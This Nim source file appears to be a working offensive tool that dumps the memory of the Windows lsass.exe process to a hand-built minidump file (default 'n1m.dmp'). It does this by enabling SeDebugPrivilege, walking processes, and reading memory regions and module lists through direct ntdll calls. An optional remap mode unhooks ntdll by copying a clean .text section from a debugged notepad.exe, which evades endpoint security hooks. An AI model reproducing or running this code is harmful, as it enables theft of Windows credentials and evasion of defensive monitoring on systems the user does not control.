import winim/lean
import strformat
import strutils
import parseopt

const
  MAX_PATH = 260
  ProcessBasicInformationSize = 48
  PebOffset = 0x8
  LdrOffset = 0x18
  InInitializationOrderModuleListOffset = 0x30
  FLinkDllBaseOffset = 0x20
  FLinkBufferFullDllNameOffset = 0x40
  FLinkBufferOffset = 0x50

type
  MemFile* = object
    filename*: string
    content*: ptr UncheckedArray[byte]
    size*: csize_t

  ModuleInformation* = object
    base_dll_name*: array[MAX_PATH, char]
    full_dll_path*: array[MAX_PATH, char]
    dll_base*: PVOID
    size*: int

  Luid* = object
    lowPart*: DWORD
    highPart*: DWORD

  TokenPrivileges* = object
    privilegeCount*: DWORD
    luid*: Luid
    attributes*: DWORD

  MEMORY_INFORMATION_CLASS* = enum
    MemoryBasicInformation = 0

proc RtlGetVersion*(lpVersionInformation: var OSVERSIONINFOEX): NTSTATUS {.discardable, dynlib: "ntdll", importc: "RtlGetVersion".}
proc NtOpenProcessToken(ProcessHandle: HANDLE, DesiredAccess: DWORD, TokenHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtOpenProcessToken".}
proc NtAdjustPrivilegesToken(TokenHandle: HANDLE, DisableAllPrivileges: BOOLEAN, NewState: ptr TokenPrivileges, BufferLength: DWORD, PreviousState: PVOID, ReturnLength: PDWORD): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtAdjustPrivilegesToken".}
proc NtClose(Handle: HANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtClose".}
proc NtGetNextProcess(ProcessHandle: HANDLE, DesiredAccess: ACCESS_MASK, HandleAttributes: ULONG, Flags: ULONG, NewProcessHandle: PHANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtGetNextProcess".}
proc NtQueryInformationProcess(ProcessHandle: HANDLE, ProcessInformationClass: PROCESSINFOCLASS, ProcessInformation: PVOID, ProcessInformationLength: ULONG, ReturnLength: PULONG): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryInformationProcess".}
proc NtReadVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: SIZE_T, NumberOfBytesRead: PSIZE_T): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtReadVirtualMemory".}
proc NtQueryVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, MemoryInformationClass: MEMORY_INFORMATION_CLASS, MemoryInformation: PVOID, MemoryInformationLength: SIZE_T, ReturnLength: PSIZE_T): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtQueryVirtualMemory".}
proc NtRemoveProcessDebug*(ProcessHandle: HANDLE, DebugObjectHandle: HANDLE): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtRemoveProcessDebug".}
proc NtTerminateProcess*(ProcessHandle: HANDLE, ExitStatus: NTSTATUS): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtTerminateProcess".}
proc NtWriteVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, BufferSize: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtWriteVirtualMemory".}
proc NtProtectVirtualMemory*(ProcessHandle: HANDLE, BaseAddress: ptr PVOID, RegionSize: ptr SIZE_T, NewProtect: ULONG, OldProtect: PULONG): NTSTATUS {.discardable, dynlib: "ntdll", importc: "NtProtectVirtualMemory".}


proc enableDebugPrivileges*() =
  let currentProcess = GetCurrentProcess()
  var tokenHandle: HANDLE

  let openStatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY or TOKEN_ADJUST_PRIVILEGES, addr tokenHandle)
  if openStatus != 0:
    echo "[-] NtOpenProcessToken failed. NTSTATUS: 0x", toHex(cast[int32](openStatus), 8)
    quit(-1)

  var tp = TokenPrivileges(
    privilegeCount: 1,
    luid: Luid(lowPart: 20, highPart: 0),
    attributes: SE_PRIVILEGE_ENABLED
  )

  let adjustStatus = NtAdjustPrivilegesToken(tokenHandle, FALSE, addr tp, DWORD(sizeof(tp)), nil, nil)
  if adjustStatus != 0:
    echo "[-] NtAdjustPrivilegesToken failed. NTSTATUS: 0x", toHex(cast[int32](adjustStatus), 8)
    NtClose(tokenHandle)
    quit(-1)

  NtClose(tokenHandle)

  echo "[+] SeDebugPrivilege successfully enabled"


proc readRemoteIntPtr*(hProcess: HANDLE, memAddress: PVOID): PVOID =
    var
        buff: array[8, BYTE]
        bytesRead: SIZE_T

    let ntstatus = NtReadVirtualMemory(
        hProcess,
        memAddress,
        addr buff[0],
        sizeof(buff).SIZE_T,
        addr bytesRead
    )

    if ntstatus != 0 and ntstatus != 0xC0000005 and ntstatus != 0x8000000D and hProcess != 0:
        echo fmt"[-] Error calling NtReadVirtualMemory (readRemoteIntPtr). NTSTATUS: 0x{cast[int](ntstatus):X} reading address 0x{cast[int](memAddress):X}"
        return nil

    result = cast[PVOID](cast[ptr int64](addr buff[0])[])


proc readRemoteWStr*(hProcess: HANDLE, memAddress: PVOID): string =
    var
        buff: array[256, BYTE]
        bytesRead: SIZE_T

    let ntstatus = NtReadVirtualMemory(
        hProcess,
        memAddress,
        addr buff[0],
        sizeof(buff).SIZE_T,
        addr bytesRead
    )

    if ntstatus != 0 and ntstatus != 0xC0000005 and ntstatus != 0x8000000D and hProcess != 0:
        echo fmt"[-] Error calling NtReadVirtualMemory (readRemoteWStr). NTSTATUS: 0x{cast[int](ntstatus):X} reading address 0x{cast[int](memAddress):X}"

    var unicodeStr = ""
    var i = 0
    while i < sizeof(buff) - 1:
        if buff[i] == 0 and buff[i+1] == 0:
            break

        let wch = cast[ptr WCHAR](addr buff[i])[]
        unicodeStr.add(char(wch))
        i += 2

    return unicodeStr


proc getProcNameFromHandle*(processHandle: HANDLE): string =
    const
        ProcessBasicInformationSize = 48
        PebOffset = 0x8
        CommandLineOffset = 0x68
        ProcessParametersOffset = 0x20

    var
        pbiByteArray: array[ProcessBasicInformationSize, BYTE]
        returnLength: ULONG

    let ntstatus = NtQueryInformationProcess(
        processHandle,
        0.PROCESSINFOCLASS,
        cast[PVOID](addr pbiByteArray[0]),
        ProcessBasicInformationSize.ULONG,
        addr returnLength
    )

    if ntstatus != 0:
        echo fmt"[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x{cast[int](ntstatus):08X}"
        return ""

    let pebPointer = cast[PVOID](cast[uint](addr pbiByteArray[0]) + PebOffset)
    let pebAddress = cast[PVOID](cast[ptr PVOID](pebPointer)[])

    let processParametersPointer = cast[PVOID](cast[uint](pebAddress) + ProcessParametersOffset)

    let processParametersAddress = readRemoteIntPtr(processHandle, processParametersPointer)
    let commandLinePointer = cast[PVOID](cast[uint](processParametersAddress) + CommandLineOffset)
    let commandLineAddress = readRemoteIntPtr(processHandle, commandLinePointer)
    let commandLineValue = readRemoteWStr(processHandle, commandLineAddress)

    return commandLineValue


proc toLowercase*(str: var string) =

    for i in 0..<str.len:
        str[i] = str[i].toLowerAscii()


proc getProcessByName*(procName: string): HANDLE =
    let targetName = procName.toLowerAscii()

    var auxHandle: HANDLE = 0
    while NT_SUCCESS(NtGetNextProcess(auxHandle, MAXIMUM_ALLOWED, 0, 0, addr auxHandle)):
        let currentName = getProcNameFromHandle(auxHandle).toLowerAscii()
        if currentName == targetName:
            return auxHandle
    return 0


proc getMemoryRegions*(hProcess: HANDLE, count: var int): ptr MemFile =
  var
    memfileCount = 0
    procMaxAddress = 0x7FFFFFFEFFFF'u64
    memAddress: PVOID = nil
    memfileList: ptr UncheckedArray[MemFile] = nil

  while cast[uint64](memAddress) < procMaxAddress:
    var mbi: MEMORY_BASIC_INFORMATION
    var returnSize: SIZE_T

    let ntstatus = NtQueryVirtualMemory(
        hProcess,
        memAddress,
        MemoryBasicInformation,
        addr mbi,
        sizeof(mbi).SIZE_T,
        addr returnSize
    )

    if ntstatus != 0:
        break

    if mbi.Protect != PAGE_NOACCESS and mbi.State == MEM_COMMIT and ((mbi.Protect and PAGE_GUARD) == 0):
        inc(memfileCount)

    memAddress = cast[PVOID](cast[uint64](memAddress) + cast[uint64](mbi.RegionSize))

  if memfileCount == 0:
    return nil

  memfileList = cast[ptr UncheckedArray[MemFile]](alloc0(memfileCount * sizeof(MemFile)))
  if memfileList == nil:
    return nil

  memAddress = nil
  var currentIndex = 0

  while cast[uint64](memAddress) < procMaxAddress and currentIndex < memfileCount:
    var mbi: MEMORY_BASIC_INFORMATION
    var returnSize: SIZE_T

    let ntstatus = NtQueryVirtualMemory(
        hProcess,
        memAddress,
        MemoryBasicInformation,
        addr mbi,
        sizeof(mbi).SIZE_T,
        addr returnSize
    )

    if ntstatus != 0:
        break

    if mbi.Protect != PAGE_NOACCESS and mbi.State == MEM_COMMIT and ((mbi.Protect and PAGE_GUARD) == 0):
        let filename = "0X" & fmt"{cast[int](mbi.BaseAddress):X}"
        let regionSize = mbi.RegionSize
        let buffer = cast[ptr UncheckedArray[byte]](alloc(regionSize))
        var bytesRead: SIZE_T = 0

        let status = NtReadVirtualMemory(hProcess, mbi.BaseAddress, buffer, regionSize, addr bytesRead)
        let unsignedStatus = cast[uint32](status)

        const STATUS_SUCCESS = 0x00000000'u32
        const STATUS_PARTIAL_COPY = 0x8000000D'u32

        if unsignedStatus == STATUS_SUCCESS or unsignedStatus == STATUS_PARTIAL_COPY:
            memfileList[currentIndex] = MemFile(
                filename: filename,
                content: buffer,
                size: cast[csize_t](regionSize)
            )
            inc(currentIndex)
        else:
            dealloc(buffer)

    memAddress = cast[PVOID](cast[uint64](memAddress) + cast[uint64](mbi.RegionSize))

  echo fmt"[+] Number of memory regions: {currentIndex}"
  count = currentIndex

  if currentIndex > 0:
    return addr(memfileList[0])
  else:
    dealloc(memfileList)
    return nil


proc findModuleByName*(moduleList: ptr ModuleInformation, listSize: int, auxName: array[MAX_PATH, char]): ModuleInformation =

    for i in 0..<listSize:
        let currentModule = cast[ptr UncheckedArray[ModuleInformation]](moduleList)[i]
        if cmpIgnoreCase($currentModule.base_dll_name, $cast[cstring](addr auxName[0])) == 0:
            return currentModule

    var emptyModule: ModuleInformation
    zeroMem(addr emptyModule, sizeof(ModuleInformation))
    return emptyModule


proc findModuleIndexByName*(
    moduleList: ptr ModuleInformation,
    listSize: int,
    auxName: array[MAX_PATH, char]
): int =

  let target = $cast[cstring](addr auxName[0])
  for i in 0..<listSize:
    let currentModule = cast[ptr UncheckedArray[ModuleInformation]](moduleList)[i]

    let name = $cast[cstring](addr currentModule.base_dll_name[0])

    if cmpIgnoreCase(name, target) == 0:
      return i
  return -1


proc customGetModuleHandle*(hProcess: HANDLE, moduleCount: ptr int): ptr ModuleInformation =
  var
    moduleList = cast[ptr ModuleInformation](alloc(1024 * sizeof(ModuleInformation)))
    moduleCounter = 0
    pbiByteArray: array[ProcessBasicInformationSize, BYTE]
    returnLength: ULONG

  let ntstatus = NtQueryInformationProcess(
    hProcess,
    0.PROCESSINFOCLASS,
    cast[PVOID](addr pbiByteArray[0]),
    ProcessBasicInformationSize.ULONG,
    addr returnLength
  )

  if ntstatus != 0:
    echo "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x", toHex(cast[int](ntstatus), 8)
    return nil

  let pebPointer = cast[uint](addr pbiByteArray[0]) + PebOffset
  let pebAddress = cast[ptr PVOID](pebPointer)[]

  let ldrPointer = cast[uint](pebAddress) + LdrOffset
  let ldrAddress = readRemoteIntPtr(hProcess, cast[PVOID](ldrPointer))

  let initOrderModuleList = cast[uint](ldrAddress) + InInitializationOrderModuleListOffset
  var nextFlink = readRemoteIntPtr(hProcess, cast[PVOID](initOrderModuleList))

  var dllBase: PVOID
  while true:
    dllBase = nil
    nextFlink = cast[PVOID](cast[uint](nextFlink) - 0x10)
    dllBase = readRemoteIntPtr(hProcess, cast[PVOID](cast[uint](nextFlink) + FLinkDllBaseOffset))

    if dllBase == nil:
      break

    let buffer = readRemoteIntPtr(hProcess, cast[PVOID](cast[uint](nextFlink) + FLinkBufferOffset))
    let baseDllName = readRemoteWStr(hProcess, buffer)

    var newModule: ModuleInformation
    copyMem(addr newModule.base_dll_name[0], addr baseDllName[0], min(baseDllName.len, MAX_PATH - 1))

    let fullDllNameAddr = readRemoteIntPtr(hProcess, cast[PVOID](cast[uint](nextFlink) + FLinkBufferFullDllNameOffset))
    let fullDllName = readRemoteWStr(hProcess, fullDllNameAddr)
    copyMem(addr newModule.full_dll_path[0], addr fullDllName[0], min(fullDllName.len, MAX_PATH - 1))

    newModule.dll_base = dllBase
    newModule.size = 0

    copyMem(cast[pointer](cast[uint](moduleList) + cast[uint](moduleCounter * sizeof(ModuleInformation))),
        addr newModule,
        sizeof(ModuleInformation))
    moduleCounter += 1

    nextFlink = readRemoteIntPtr(hProcess, cast[PVOID](cast[uint](nextFlink) + 0x10))

  moduleCount[] = moduleCounter
  return moduleList


proc getModulesInformation*(hProcess: HANDLE, count: var int): ptr ModuleInformation =
  var moduleCounter: int = 0
  let moduleInformationList = customGetModuleHandle(hProcess, addr moduleCounter)
  echo "[+] Number of modules: ", moduleCounter

  var
    procMaxAddress = 0x7FFFFFFEFFFF'u64
    memAddress: PVOID = nil
    auxSize = 0
    auxName: array[MAX_PATH, char]

  let moduleArray = cast[ptr UncheckedArray[ModuleInformation]](moduleInformationList)
  while cast[uint64](memAddress) < procMaxAddress:
      var mbi: MEMORY_BASIC_INFORMATION
      var returnSize: SIZE_T

      let ntstatus = NtQueryVirtualMemory(
          hProcess,
          memAddress,
          MemoryBasicInformation,
          addr mbi,
          sizeof(mbi).SIZE_T,
          addr returnSize
      )

      if ntstatus != 0:
          echo fmt"[-] Error NtQueryVirtualMemory: 0x{ntstatus:X}"
          break

      if mbi.Protect != PAGE_NOACCESS and mbi.State == MEM_COMMIT:

          let currentModule = findModuleByName(moduleInformationList, moduleCounter, auxName)

          if mbi.RegionSize == 0x1000 and mbi.BaseAddress != currentModule.dll_base:
              let auxIndex = findModuleIndexByName(moduleInformationList, moduleCounter, auxName)
              if auxIndex >= 0:
                  var modifiedModule = moduleArray[auxIndex]
                  modifiedModule.size = auxSize
                  copyMem(
                      cast[pointer](cast[uint](moduleInformationList) + cast[uint](auxIndex * sizeof(ModuleInformation))),
                      addr modifiedModule,
                      sizeof(ModuleInformation)
                  )

          var foundIndex = -1
          for k in 0..<moduleCounter:
              if mbi.BaseAddress == moduleArray[k].dll_base:
                  foundIndex = k
                  break

          if foundIndex >= 0:

              if auxName[0] != '\0':
                  let prevIndex = findModuleIndexByName(moduleInformationList, moduleCounter, auxName)
                  if prevIndex >= 0:
                      var prevMod = moduleArray[prevIndex]
                      prevMod.size = auxSize
                      copyMem(
                          cast[pointer](cast[uint](moduleInformationList) + cast[uint](prevIndex * sizeof(ModuleInformation))),
                          addr prevMod,
                          sizeof(ModuleInformation)
                      )

              copyMem(addr auxName[0], addr moduleArray[foundIndex].base_dll_name[0], MAX_PATH)
              auxSize = cast[int](mbi.RegionSize)
          else:

              auxSize += cast[int](mbi.RegionSize)

      memAddress = cast[PVOID](cast[uint64](memAddress) + cast[uint64](mbi.RegionSize))

  if auxName[0] != '\0':
      let lastIndex = findModuleIndexByName(moduleInformationList, moduleCounter, auxName)
      if lastIndex >= 0:
          var lastMod = moduleArray[lastIndex]
          lastMod.size = auxSize
          copyMem(
              cast[pointer](cast[uint](moduleInformationList) + cast[uint](lastIndex * sizeof(ModuleInformation))),
              addr lastMod,
              sizeof(ModuleInformation)
          )

  let lastIndex = findModuleIndexByName(moduleInformationList, moduleCounter, auxName)
  if lastIndex >= 0:
    var lastMod = moduleArray[lastIndex]
    lastMod.size = auxSize
    copyMem(addr moduleArray[lastIndex], addr lastMod, sizeof(ModuleInformation))

  count = moduleCounter
  return moduleInformationList


proc getBuildNumber*(): OSVERSIONINFOEX =
  var osVersionInfo: OSVERSIONINFOEX
  osVersionInfo.dwOSVersionInfoSize = DWORD sizeof(OSVERSIONINFOEX)
  discard RtlGetVersion(osVersionInfo)
  result = osVersionInfo


proc custom_get_module_address*(h_process: HANDLE, module_name: string): uint64 =
    const
        process_basic_information_size = 48'u32
        peb_offset = 0x8
        ldr_offset = 0x18
        in_initialization_order_module_list_offset = 0x30
        flink_dllbase_offset = 0x20
        flink_buffer_offset = 0x50

    var
        pbi_byte_array: array[process_basic_information_size, BYTE]
        return_length: ULONG = 0
        ntstatus: NTSTATUS

    ntstatus = NtQueryInformationProcess(
        h_process,
        0.PROCESSINFOCLASS,
        cast[PVOID](addr pbiByteArray[0]),
        process_basic_information_size.ULONG,
        addr returnLength
    )

    if ntstatus != 0:
        echo "[-] Error calling NtQueryInformationProcess. NTSTATUS: 0x", toHex(cast[int](ntstatus))
        return 0'u64

    let peb_pointer = cast[PVOID](cast[uint64](addr pbi_byte_array[0]) + peb_offset)
    let currentProcess = cast[HANDLE](-1)

    var peb_address = cast[uint64](readRemoteIntPtr(currentProcess, peb_pointer))
    if peb_address == 0:
        return 0'u64

    let ldr_pointer = cast[PVOID](peb_address + ldr_offset)
    var ldr_address = cast[uint64](readRemoteIntPtr(h_process, ldr_pointer))
    if ldr_address == 0:
        return 0'u64

    let in_initialization_order_module_list = ldr_address + in_initialization_order_module_list_offset
    var next_flink = cast[uint64](readRemoteIntPtr(h_process, cast[PVOID](in_initialization_order_module_list)))
    var dll_base = high(uint64)

    while dll_base != 0:
        next_flink -= 0x10

        let buffer = cast[uint64](readRemoteIntPtr(h_process, cast[PVOID](next_flink + flink_buffer_offset)))
        var base_dll_name = ""

        if buffer != 0:
            base_dll_name = readRemoteWStr(h_process, cast[PVOID](buffer))

        if base_dll_name == module_name:

            dll_base = cast[uint64](readRemoteIntPtr(h_process, cast[PVOID](next_flink + flink_dllbase_offset)))
            return dll_base

        next_flink = cast[uint64](readRemoteIntPtr(h_process, cast[PVOID](next_flink + 0x10)))

    return 0'u64


proc get_text_section_info*(ntdll_address: PVOID): array[2, uint32] =
    let h_process = cast[HANDLE](-1)
    var e_lfanew_data: array[4, BYTE]
    let e_lfanew_address = cast[PVOID](cast[uint64](ntdll_address) + 0x3C)

    var bytesRead: SIZE_T
    discard NtReadVirtualMemory(
        h_process,
        e_lfanew_address,
        addr e_lfanew_data[0],
        4,
        addr bytesRead
    )

    let e_lfanew = cast[ptr uint32](addr e_lfanew_data[0])[]

    let nt_headers_address = cast[uint64](ntdll_address) + e_lfanew
    let optional_header_address = nt_headers_address + 24

    let sizeofcode_address = cast[PVOID](optional_header_address + 4)
    var sizeofcode_data: array[4, BYTE]

    discard NtReadVirtualMemory(
        h_process,
        sizeofcode_address,
        addr sizeofcode_data[0],
        sizeof(sizeofcode_data),
        addr bytesRead
    )

    let sizeofcode = cast[ptr uint32](addr sizeofcode_data[0])[]

    let baseofcode_address = cast[PVOID](optional_header_address + 20)
    var baseofcode_data: array[4, BYTE]

    discard NtReadVirtualMemory(
        h_process,
        baseofcode_address,
        addr baseofcode_data[0],
        sizeof(baseofcode_data),
        addr bytesRead
    )

    let baseofcode = cast[ptr uint32](addr baseofcode_data[0])[]

    [baseofcode, sizeofcode]


proc get_ntdll_from_debug_proc*(process_path: string): ptr uint8 =
    var
        si: STARTUPINFOW
        pi: PROCESS_INFORMATION
        debug_object_handle: HANDLE
        return_length: ULONG
        status: NTSTATUS

    zeroMem(addr si, sizeof(si).SIZE_T)
    si.cb = sizeof(si).DWORD
    zeroMem(addr pi, sizeof(pi).SIZE_T)

    let success = CreateProcessW(
        newWideCString(process_path),
        nil,
        nil,
        nil,
        false,
        DEBUG_PROCESS,
        nil,
        nil,
        addr si,
        addr pi
    )
    if success == 0:
        echo "[-] CreateProcess failed"
        quit(1)

    let current_process = cast[HANDLE](-1)
    let local_ntdll_handle = custom_get_module_address(current_process, "ntdll.dll")
    if local_ntdll_handle == 0:
        echo "[-] Failed to locate ntdll.dll in current process"
        quit(1)
    let text_section = get_text_section_info(cast[PVOID](local_ntdll_handle))
    let local_ntdll_txt_base = text_section[0]
    let local_ntdll_txt_size = text_section[1]
    let local_ntdll_txt = local_ntdll_handle + local_ntdll_txt_base

    var ntdll_buffer = newSeq[byte](local_ntdll_txt_size)
    var bytesRead: SIZE_T
    status = NtReadVirtualMemory(
        pi.hProcess,
        cast[PVOID](local_ntdll_txt),
        addr ntdll_buffer[0],
        local_ntdll_txt_size.SIZE_T,
        addr bytesRead
    )
    if status != 0:
        echo "[-] Read operation failed"
        quit(1)

    status = NtQueryInformationProcess(
        pi.hProcess,
        30.PROCESSINFOCLASS,
        addr debug_object_handle,
        sizeof(debug_object_handle).ULONG,
        addr return_length
    )
    if status != 0:
        echo "[-] Failed to get debug object handle"
        quit(1)

    status = NtRemoveProcessDebug(pi.hProcess, debug_object_handle)
    if status != 0:
        echo "[-] Failed to remove process debug"
        quit(1)
    let terminate_result = NtTerminateProcess(pi.hProcess, 0)
    if terminate_result != 0:
        echo "[-] Failed to terminate process"
        quit(1)

    let close_handle_proc = NtClose(pi.hProcess)
    let close_handle_thread = NtClose(pi.hThread)
    if close_handle_proc != 0 or close_handle_thread != 0:
        echo "[-] Handle closure failed"
        quit(1)
    result = cast[ptr uint8](addr ntdll_buffer[0])


proc replace_ntdll_txt_section*(unhooked_ntdll_txt: pointer, local_ntdll_txt: pointer, local_ntdll_txt_size: uint32) =
    var
        dw_old_protection: ULONG = 0
        current_process = cast[HANDLE](-1)
        region_size = local_ntdll_txt_size.SIZE_T
        status: NTSTATUS

    status = NtProtectVirtualMemory(
        current_process,
        addr local_ntdll_txt,
        addr region_size,
        PAGE_EXECUTE_WRITECOPY,
        addr dw_old_protection
    )
    if status != 0:
        echo "[-] Failed to change memory protection"
        quit(1)

    let src = cast[ptr UncheckedArray[byte]](unhooked_ntdll_txt)
    let dst = cast[ptr UncheckedArray[byte]](local_ntdll_txt)
    for i in 0..<local_ntdll_txt_size:
        dst[i] = src[i]

    status = NtProtectVirtualMemory(
        current_process,
        addr local_ntdll_txt,
        addr region_size,
        dw_old_protection,
        addr dw_old_protection
    )
    if status != 0:
        echo "[-] Failed to restore memory protection"
        quit(1)


proc remap_library*() =
  let unhookedNtdllTxt = get_ntdll_from_debug_proc("C:\\Windows\\System32\\notepad.exe")
  let currentProcess = cast[HANDLE](-1)
  let localNtdllHandle = custom_get_module_address(currentProcess, "ntdll.dll")

  if localNtdllHandle == 0:
      echo "[-] Failed to get ntdll.dll base address"
      quit(1)

  let text_section = get_text_section_info(cast[PVOID](localNtdllHandle))
  let localNtdllTxtBase = text_section[0]
  let localNtdllTxtSize = text_section[1]
  let localNtdllTxt = cast[pointer](localNtdllHandle + localNtdllTxtBase)

  echo fmt"[+] Replacing 0x{localNtdllTxtSize:X} bytes from 0x{cast[uint64](unhookedNtdllTxt):X} to 0x{cast[uint64](localNtdllTxt):X}"
  replace_ntdll_txt_section(cast[pointer](unhookedNtdllTxt), localNtdllTxt, localNtdllTxtSize.uint32)


proc uint32_to_little_endian_bytes*(value: uint32): seq[byte] =
  result = newSeq[byte](4)
  copyMem(addr result[0], unsafeAddr value, 4)


proc uint64_to_little_endian_bytes*(value: uint64): seq[byte] =
  result = newSeq[byte](8)
  copyMem(addr result[0], unsafeAddr value, 8)


proc hex_string_to_little_endian_bytes*(hex_string: string): seq[byte] =
  let value = parseHexInt(hex_string).uint64
  result = newSeq[byte](8)
  copyMem(addr result[0], unsafeAddr value, 8)


proc encodeUtf16LE(s: string): seq[byte] =
  result = @[]
  for c in s:
    let code = c.ord.uint16
    result.add(byte(code and 0xFF))
    result.add(byte((code shr 8) and 0xFF))

proc generate_bytes*(os_info: OSVERSIONINFOEXW, module_information_list: ptr ModuleInformation,
                    module_count: int, memfile_list: ptr MemFile, memfile_count: int): seq[byte] =
  let moduleArray = cast[ptr UncheckedArray[ModuleInformation]](module_information_list)
  let memfileArray = cast[ptr UncheckedArray[MemFile]](memfile_list)

  let number_modules = module_count
  var modulelist_size = 4 + 108 * number_modules

  for i in 0..<module_count:
    let module_info = moduleArray[i]
    let full_path_str = $cast[cstring](addr module_info.full_dll_path[0])
    let clean_path = full_path_str.replace("\\\\", "\\")
    let path_size = clean_path.len * 2 + 8
    modulelist_size += path_size

  let
    mem64list_offset = modulelist_size + 0x7C
    mem64list_size = 16 + 16 * memfile_count
    offset_memory_regions = mem64list_offset + mem64list_size

  echo "[+] Total number of modules:    ", number_modules
  echo "[+] ModuleListStream size:      ", modulelist_size
  echo "[+] Mem64List offset:           ", mem64list_offset
  echo "[+] Mem64List size:             ", mem64list_size

  var header = @[
    0x4D'u8, 0x44, 0x4D, 0x50,
    0x93, 0xA7,
    0x00, 0x00,
    0x03, 0x00, 0x00, 0x00,
    0x20, 0x00, 0x00, 0x00
  ]
  header.add(newSeq[byte](32 - 16))

  var stream_directory = @[
    0x04'u8, 0x00, 0x00, 0x00
  ]
  stream_directory.add(uint32_to_little_endian_bytes(modulelist_size.uint32))
  stream_directory.add(@[
    0x7C'u8, 0x00, 0x00, 0x00,
    0x07, 0x00, 0x00, 0x00,
    0x38, 0x00, 0x00, 0x00,
    0x44, 0x00, 0x00, 0x00,
    0x09, 0x00, 0x00, 0x00
  ])
  stream_directory.add(uint32_to_little_endian_bytes(mem64list_size.uint32))
  stream_directory.add(uint32_to_little_endian_bytes(mem64list_offset.uint32))

  var systeminfo_stream = @[
    0x09'u8, 0x00
  ]
  systeminfo_stream.add(newSeq[byte](6))
  systeminfo_stream.add(uint32_to_little_endian_bytes(uint32(os_info.dwMajorVersion)))
  systeminfo_stream.add(uint32_to_little_endian_bytes(uint32(os_info.dwMinorVersion)))
  systeminfo_stream.add(uint32_to_little_endian_bytes(uint32(os_info.dwBuildNumber)))
  systeminfo_stream.add(newSeq[byte](56 - 16 - 4))

  var modulelist_stream = uint32_to_little_endian_bytes(number_modules.uint32)
  var pointer_index = 0x7C + 4 + 108 * number_modules

  for i in 0..<module_count:
    let module_info = moduleArray[i]
    modulelist_stream.add(uint64_to_little_endian_bytes(cast[uint64](module_info.dll_base)))
    modulelist_stream.add(uint64_to_little_endian_bytes(cast[uint64](module_info.size)))
    modulelist_stream.add(newSeq[byte](4))
    modulelist_stream.add(uint64_to_little_endian_bytes(pointer_index.uint64))

    let full_path_str = $cast[cstring](addr module_info.full_dll_path[0])
    let clean_path = full_path_str.replace("\\\\", "\\")
    let path_size = clean_path.len * 2 + 8
    pointer_index += path_size
    modulelist_stream.add(newSeq[byte](108 - (8 + 8 + 4 + 8)))

  for i in 0..<module_count:
    let module_info = moduleArray[i]
    let full_path_str = $cast[cstring](addr module_info.full_dll_path[0])
    let clean_path = full_path_str.replace("\\\\", "\\")
    let
      path_bytes = encodeUtf16LE(clean_path)
      path_len = clean_path.len * 2

    modulelist_stream.add(uint32_to_little_endian_bytes(path_len.uint32))
    modulelist_stream.add(path_bytes)
    modulelist_stream.add(newSeq[byte](4))

  var memory64list_stream = uint64_to_little_endian_bytes(memfile_count.uint64)
  memory64list_stream.add(uint64_to_little_endian_bytes(offset_memory_regions.uint64))

  for i in 0..<memfile_count:
    let mem_file = memfileArray[i]
    let base_address_bytes = hex_string_to_little_endian_bytes(mem_file.filename)
    memory64list_stream.add(base_address_bytes)
    memory64list_stream.add(uint64_to_little_endian_bytes(mem_file.size))

  for i in 0..<memfile_count:
    let mem_file = memfileArray[i]
    let size = int(mem_file.size)
    if size > 0:
      let contentPtr = cast[ptr UncheckedArray[byte]](mem_file.content)
      for j in 0..<size:
        memory64list_stream.add(contentPtr[j])
    else:
      echo "[!] Warning: Empty memory region ", mem_file.filename

  result = header & stream_directory & systeminfo_stream & modulelist_stream & memory64list_stream


proc save_dump_file*(bytes: seq[byte], filename: string): bool =
  try:
    writeFile(filename, bytes)
    echo "[+] File ", filename, " generated correctly"
    return true
  except IOError, OSError:
    echo "[-] Error: ", getCurrentExceptionMsg()
    return false


proc main() =
  var
    dumpFile = "n1m.dmp"
    shouldRemap = false

  for kind, key, val in getopt():
    case kind
    of cmdArgument:
      discard
    of cmdLongOption, cmdShortOption:
      case key
      of "o", "output":
        if val.len > 0:
          dumpFile = val
      of "r", "remap":
        shouldRemap = true
      else:
        echo "Unknown option: ", key
        quit(1)
    of cmdEnd:
      discard

  if shouldRemap:
    remap_library()

  enableDebugPrivileges()
  let hProcess = getProcessByName("C:\\WINDOWS\\system32\\lsass.exe")
  if hProcess == 0:
    quit(-1)

  let osInfo = getBuildNumber()
  var moduleCount: int = 0
  let moduleInformationList = getModulesInformation(hProcess, moduleCount)
  var memFileCount: int = 0
  let memFiles = getMemoryRegions(hProcess, memFileCount)

  let dumpBytes = generate_bytes(osInfo, moduleInformationList, moduleCount, memFiles, memFileCount)
  if not save_dump_file(dumpBytes, dumpFile):
    echo "[-] Error creating the dump file"


when isMainModule:
  main()